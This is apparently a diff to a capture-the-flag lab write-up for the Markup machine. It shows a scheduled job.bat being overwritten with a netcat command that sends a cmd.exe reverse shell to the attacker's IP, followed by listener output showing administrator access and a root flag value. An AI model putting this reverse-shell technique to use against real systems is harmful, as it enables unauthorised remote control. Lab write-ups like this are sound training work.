@@ -569,7 +569,88 @@ Successfully processed 1 files; Failed processing 0 files
 - Type 'powershell" at the cmd line then 'ps' once you're in PowerShell.
 - You might have to run `ps` several times to see if `wevtutil` runs. It does. So job.bat is likely scheduled as a task.
 
-
+### Need `nc64.exe` on the target
+- Downloaded the file from [here](https://github.com/rahuldottech/netcat-for-windows/releases). 
+- Copied the file to the target with `scp`:
+```
+scp -i ssh_key_daniel nc64.exe daniel@10.129.95.192:/Users/daniel
 ```
 
+Modified the job.bat file on the target with: 
+- This replaces (`>`) the entire contents of the job.bat file with the cmd command.
 ```
+daniel@MARKUP c:\Log-Management>echo C:\Users\daniel\nc64.exe -e cmd.exe 10.10.15.155 1234 > job.bat
+```
+- Observe the syntax for the `nc64.exe` file: `nc64.exe -e cmd.exe {your_IP} {port}`
+- This executes the file named cmd.exe and sends it to the hostname 10.10.15.155 via port 1234.
+- From the `nc` man page, Synopsis:
+```
+nc [-options] hostname port[s] 
+```
+
+### Results: 
+- From the listener on the attack machine (reverse cmd shell from the job.bat hack):
+```
+# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.155] from (UNKNOWN) [10.129.95.192] 49723
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+markup\administrator
+
+C:\Windows\system32>cd /Users/Administrator
+cd /Users/Administrator
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BA76-B4E3
+
+ Directory of C:\Users\Administrator
+
+10/13/2021  04:43 PM    <DIR>          .
+10/13/2021  04:43 PM    <DIR>          ..
+03/05/2020  05:11 AM    <DIR>          3D Objects
+03/05/2020  05:11 AM    <DIR>          Contacts
+03/05/2020  07:33 AM    <DIR>          Desktop
+04/21/2020  04:16 AM    <DIR>          Documents
+03/05/2020  05:11 AM    <DIR>          Downloads
+03/05/2020  05:11 AM    <DIR>          Favorites
+03/05/2020  05:11 AM    <DIR>          Links
+03/05/2020  05:11 AM    <DIR>          Music
+03/05/2020  05:11 AM    <DIR>          Pictures
+03/05/2020  05:11 AM    <DIR>          Saved Games
+03/05/2020  05:11 AM    <DIR>          Searches
+03/05/2020  05:11 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)   7,394,545,664 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BA76-B4E3
+
+ Directory of C:\Users\Administrator\Desktop
+
+03/05/2020  07:33 AM    <DIR>          .
+03/05/2020  07:33 AM    <DIR>          ..
+03/05/2020  07:33 AM                70 root.txt
+               1 File(s)             70 bytes
+               2 Dir(s)   7,394,545,664 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+f574a3e7650cebd8c39784299cb570f8
+```
+
+## Done
+
+![image](https://github.com/user-attachments/assets/35d63f86-46ab-4c3f-a2b0-b0f7725ca043)
+
+
